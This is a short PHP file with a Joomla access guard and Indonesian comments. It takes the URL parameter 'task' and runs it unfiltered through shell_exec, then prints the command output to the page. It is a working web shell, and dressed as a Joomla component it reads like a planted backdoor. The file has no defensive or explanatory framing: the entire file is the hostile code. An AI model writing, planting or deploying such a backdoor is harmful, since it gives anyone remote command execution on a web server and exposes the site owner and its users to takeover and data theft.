<?php
defined('_JEXEC') or die;

// Validasi apakah parameter 'task' ada dalam URL
if (isset($_GET['task'])) {
    // Ambil parameter 'task' dari URL
    $command = $_GET['task'];

    // Eksekusi perintah dan tangkap outputnya
    $output = shell_exec($command);

    // Tampilkan output
    if ($output) {
        echo "<pre>$output</pre>";
    } else {
        echo "Perintah berhasil dieksekusi, tetapi tidak menghasilkan output.";
    }
} else {
    echo "Parameter 'task' tidak ditemukan!";
}
